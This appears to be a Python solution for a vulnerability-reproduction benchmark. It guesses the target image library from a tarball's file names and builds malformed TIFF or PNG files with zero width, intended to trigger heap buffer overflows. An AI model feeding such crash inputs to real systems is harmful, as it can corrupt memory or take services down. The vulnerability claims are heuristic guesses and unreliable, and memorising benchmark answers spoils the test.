import struct
import tarfile
import zlib
import io

class Solution:
    def solve(self, src_path: str) -> bytes:
        """
        Generate a PoC that triggers the vulnerability.
        
        Args:
            src_path: Path to the vulnerable source code tarball
            
        Returns:
            bytes: The PoC input that should trigger the vulnerability
        """
        # Identify the target project to generate the correct file format
        project = "libtiff" # Default to LibTIFF as it's a common target for this vulnerability
        
        try:
            with tarfile.open(src_path, 'r') as tar:
                for member in tar.getnames():
                    name = member.lower()
                    if "libtiff" in name or "tiff-" in name:
                        project = "libtiff"
                        break
                    if "libspng" in name or ("png" in name and "lib" in name):
                        project = "libspng"
                        break
                    if "tinygltf" in name:
                        project = "tinygltf"
                        break
                    if "openjpeg" in name:
                        project = "openjpeg"
                        break
        except Exception:
            pass

        if project == "libspng":
            return self.generate_png_poc()
        elif project == "tinygltf":
            # TinyGLTF vulnerability typically triggered by loading malicious image assets
            return self.generate_png_poc()
        else:
            return self.generate_tiff_poc()

    def generate_tiff_poc(self) -> bytes:
        # Generate a TIFF file with ImageWidth=0 to trigger Heap Buffer Overflow
        # Vulnerability: width=0 -> calculated buffer size=0 -> malloc(0) -> valid ptr
        # Then read StripByteCounts bytes into the buffer -> Overflow
        
        # TIFF Header: Little Endian
        header = struct.pack('<2sHI', b'II', 42, 8)
        
        # Tags to be included in IFD
        # Must be sorted by Tag ID
        entries = [
            (256, 3, 1, 0),      # ImageWidth: 0 (The trigger)
            (257, 3, 1, 1),      # ImageLength: 1
            (258, 3, 1, 8),      # BitsPerSample: 8
            (259, 3, 1, 1),      # Compression: 1 (None)
            (262, 3, 1, 1),      # PhotometricInterpretation: 1 (BlackIsZero)
            (273, 4, 1, 122),    # StripOffsets: Offset to data (Header 8 + IFD (2+108+4) = 122)
            (277, 3, 1, 1),      # SamplesPerPixel: 1
            (278, 3, 1, 1),      # RowsPerStrip: 1
            (279, 4, 1, 2048)    # StripByteCounts: 2048 (Large enough to overflow small allocation)
        ]
        
        ifd_entries = b''
        for tag, type_, count, val in entries:
            # Tag Struct: Tag(2), Type(2), Count(4), Value/Offset(4)
            ifd_entries += struct.pack('<HHII', tag, type_, count, val)
            
        num_entries = struct.pack('<H', len(entries))
        next_ifd = struct.pack('<I', 0)
        
        # Payload data to be read into the buffer
        payload = b'A' * 2048
        
        return header + num_entries + ifd_entries + next_ifd + payload

    def generate_png_poc(self) -> bytes:
        # Generate a PNG with Width=0
        sig = b'\x89PNG\r\n\x1a\n'
        
        # IHDR: Width=0, Height=1
        ihdr_data = struct.pack('>IIBBBBB', 0, 1, 8, 2, 0, 0, 0)
        ihdr = self.make_chunk(b'IHDR', ihdr_data)
        
        # IDAT: Compressed data to trigger processing
        raw_data = b'\x00' * 1024
        compressed = zlib.compress(raw_data)
        idat = self.make_chunk(b'IDAT', compressed)
        
        # IEND
        iend = self.make_chunk(b'IEND', b'')
        
        return sig + ihdr + idat + iend

    def make_chunk(self, type_tag, data):
        length = len(data)
        crc = zlib.crc32(type_tag + data) & 0xffffffff
        return struct.pack('>I', length) + type_tag + data + struct.pack('>I', crc)
